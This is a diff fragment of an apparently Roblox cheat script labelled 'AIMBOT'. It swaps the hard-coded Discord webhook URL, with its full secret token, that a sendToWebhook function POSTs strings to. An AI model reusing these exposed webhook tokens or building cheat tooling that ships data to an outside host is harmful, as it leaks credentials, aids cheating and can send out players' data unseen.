@@ -40,7 +40,7 @@ local CoreGui = cloneref(game:FindService("CoreGui"))
 
 function sendToWebhook(str)
     local response = request({
-            Url = "https://discord.com/api/webhooks/1328742395751174224/j2jlu7DzShsdtMh_N2cZv4MII7dTlPUXJS7aDtLv069fTPvo2S8FtGjoMvDufmBXWDqd",
+            Url = "https://discord.com/api/webhooks/1375042885245861951/jicNc-wbpT984Bj5Bpl3q5fOG6Gg1uPQJDE2zd57-Dj_ZZQQV53ECsEVs48VpA-b21rz",
             Method = "POST",
             Body = `\{"username": "AIMBOT", "content":"{str}"\}`,
             Headers = {
